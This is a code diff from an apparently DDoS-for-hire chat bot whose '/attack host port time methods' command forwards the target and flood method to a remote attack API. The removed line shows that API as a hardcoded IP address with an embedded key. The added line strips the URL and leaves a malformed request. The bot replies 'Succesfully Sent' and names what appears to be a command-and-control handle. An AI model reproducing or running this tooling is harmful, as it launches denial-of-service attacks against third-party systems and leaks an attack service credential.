@@ -138,7 +138,7 @@ bot.on('message', async (lol) => {
 				if (args.length == 1) return await reply(`Example: /attack host port time methods`)
 				if (args.length == 2) return await reply(`Example: /attack host port time methods`)
 				if (args.length == 3) return await reply(`Example: /attack host port time methods`)
-				axios.get(`http://172.105.120.228/api.php?key=TRONAPI4API&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
+				axios.get(`host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
 				await reply(`Succesfully Sent @rexonc2 : ${args[0]}\nTime : ${args[2]}\nMethods : ${args[3]}`)
 				break
 
